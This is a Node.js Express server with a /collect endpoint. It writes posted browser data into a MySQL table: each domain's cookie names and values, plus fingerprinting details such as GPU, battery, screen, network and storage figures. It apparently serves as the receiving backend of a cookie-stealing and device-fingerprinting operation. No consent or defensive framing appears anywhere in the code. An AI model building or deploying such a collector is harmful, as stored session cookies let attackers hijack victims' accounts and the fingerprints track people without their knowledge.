const express = require("express");
const mysql = require("mysql2/promise");

function safe(v) {
  return v === undefined ? null : v;
}

function toMysqlDatetime(iso) {
  if (!iso) return null;
  return iso.replace('T', ' ').replace('Z', '').split('.')[0];
}

async function main() {
  const app = express();
  app.use(express.json());

  const db = await mysql.createConnection({
    user: "1",
    password: "1",
    host: "localhost",
    database: "collected_data_db"
  });

app.post("/collect", async (req, res) => {
  try {
    const data = req.body;

    function safe(v) {
      return v === undefined ? null : v;
    }

    function toMysqlDatetime(iso) {
      if (!iso) return null;
      const noZ = iso.replace("Z", "");
      const [date, time] = noZ.split("T");
      const cleanTime = time.split(".")[0];
      return date + " " + cleanTime;
    }

    const timestamp = safe(toMysqlDatetime(data.timestamp));

    const base = {
      timestamp,
      domain: safe(data.domain),
      user_agent: safe(data.user_agent),
      platform: safe(data.platform),
      language: safe(data.language),
      screen_width: safe(data.screen_width),
      screen_height: safe(data.screen_height),
      color_depth: safe(data.color_depth),
      device_memory: safe(data.device_memory),
      hardware_concurrency: safe(data.hardware_concurrency),
      timezone: safe(data.timezone),
      browser_version: safe(data.browser_version),
      vendor: safe(data.vendor),
      gpu_vendor: safe(data.gpu_vendor),
      gpu_renderer: safe(data.gpu_renderer),
      battery_charging: safe(data.battery_charging),
      battery_level: safe(data.battery_level),
      battery_charging_time: safe(data.battery_charging_time),
      battery_discharging_time: safe(data.battery_discharging_time),
      online: safe(data.online),
      connection_type: safe(data.connection_type),
      downlink: safe(data.downlink),
      rtt: safe(data.rtt),
      storage_quota: safe(data.storage_quota),
      storage_usage: safe(data.storage_usage)
    };

    const insertSQL = `
      INSERT INTO collected_data
      (timestamp, domain, cookie_name, cookie_value, user_agent, platform, language, screen_width, screen_height, color_depth, device_memory, hardware_concurrency, timezone, browser_version, vendor, gpu_vendor, gpu_renderer, battery_charging, battery_level, battery_charging_time, battery_discharging_time, online, connection_type, downlink, rtt, storage_quota, storage_usage)
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
    `;

    if (Array.isArray(data.cookies) && data.cookies.length > 0) {
      for (const c of data.cookies) {
        await db.execute(insertSQL, [
          base.timestamp,
          base.domain,
          safe(c.name),
          safe(c.value),
          base.user_agent,
          base.platform,
          base.language,
          base.screen_width,
          base.screen_height,
          base.color_depth,
          base.device_memory,
          base.hardware_concurrency,
          base.timezone,
          base.browser_version,
          base.vendor,
          base.gpu_vendor,
          base.gpu_renderer,
          base.battery_charging,
          base.battery_level,
          base.battery_charging_time,
          base.battery_discharging_time,
          base.online,
          base.connection_type,
          base.downlink,
          base.rtt,
          base.storage_quota,
          base.storage_usage
        ]);
      }
    } else {
      await db.execute(insertSQL, [
        base.timestamp,
        base.domain,
        null,
        null,
        base.user_agent,
        base.platform,
        base.language,
        base.screen_width,
        base.screen_height,
        base.color_depth,
        base.device_memory,
        base.hardware_concurrency,
        base.timezone,
        base.browser_version,
        base.vendor,
        base.gpu_vendor,
        base.gpu_renderer,
        base.battery_charging,
        base.battery_level,
        base.battery_charging_time,
        base.battery_discharging_time,
        base.online,
        base.connection_type,
        base.downlink,
        base.rtt,
        base.storage_quota,
        base.storage_usage
      ]);
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("collect error:", err);
    res.status(500).json({ error: "insert failed" });
  }
});



  app.listen(3000, () => {
    console.log("receiver running");
  });
}

main();


